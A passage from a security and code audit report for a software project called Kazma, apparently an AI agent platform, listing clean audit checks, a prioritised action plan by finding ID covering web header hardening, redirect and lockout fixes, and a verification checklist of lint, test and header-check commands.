  (`email_manager/oauth_common.py:57-84`); GitHub state checked, cleared.
- SSRF — agent and skill HTTP calls go to fixed API hosts or through the
  validated, pinned scraping stack.
- Secrets in logs — every logging call's arguments checked by AST: 10 hits,
  none a secret.
- XSS in the markdown renderer — text escaped first, links limited to
  `https:`, `mailto:` and relative paths.
- Critical invariants of AGENTS §1-43 — each held by at least one test
  (platform isolation, system-message hoist, `turn_failed`, transient
  errors, breaker probe, handoff cycle guard, danger-tool list, prompt fence,
  cron graph builder, delivery target, gate CAS, `close_turn`, store
  refusal, child env, checkpoint serde, process priority).

## 3. Prioritized Action Plan

1. **Immediate fixes (blockers / security risks), by severity**
   1. AUD-018 — page CSP + external images as links; nosniff, Referrer-Policy,
      frame-ancestors (the clickjacking hardening rides on the same header).
   2. AUD-001 — remove semantic replay from the LLM cache.
   3. AUD-019 — same-origin check on `next` via `new URL(...)`.
   4. AUD-020 — per-account backoff instead of the global lockout.
   5. AUD-002 / AUD-003 — login and logout off the event loop; helper list.
   6. AUD-007 — one protected-key list incl. `agent.hooks.` and `mcp.`;
      hooks run with `tool_child_env()`.
   7. AUD-012 — owner: find or rotate the Slack app-level token.
   8. AUD-029 (found after the audit) — install and update only from
      Kazma's own releases, never a Kazma name on PyPI.
2. **Short-term refactoring (wiring & cleanup)**
   - AUD-013/014/016/017 — delete the hub API, the WS token path, `aiogram`
     and `tenacity`, unused imports and commented-out code; lower the
     ratchet.
   - AUD-008/009 — bounded voice upload, extension allowlist.
   - AUD-010/011/015 — fix or delete the load tests; declare direct
     dependencies; mark API-only routes.
   - AUD-021/023/024/025/028 — the Low and Info security hardening items.
3. **Long-term improvements (architecture & performance)**
   - AUD-026 — split the two chat transports' message handling into shared,
     testable functions.
   - AUD-004/005/006 — the remaining blocking I/O in async code.
   - AUD-027 — keep lowering the exception-handler ratchet.

**Verification checklist**

- `python scripts/fast_test.py --chunks 4 --chunk-timeout 1500` (full suite)
- `python -m ruff check --select E9,F63,F7,F82,F841,F401,B033 <changed files>`
- `python -m bandit -r kazma-core/kazma_core kazma-gateway/kazma_gateway kazma-ui/kazma_ui kazma-cli/kazma_cli kazma-skills/kazma_skills kazma-tui/kazma_tui tests scripts -lll -ii`
- `node --check` on every changed script; `node tests/js/<test>.js` for the
  renderer and login cases
- `python scripts/generate_env_reference.py --check`,
  `python scripts/generate_metrics.py --check-readme`
- live: `curl -D - http://127.0.0.1:9090/login` shows the CSP; the next
  Slack handshake line says `connections open for this app: 1`.
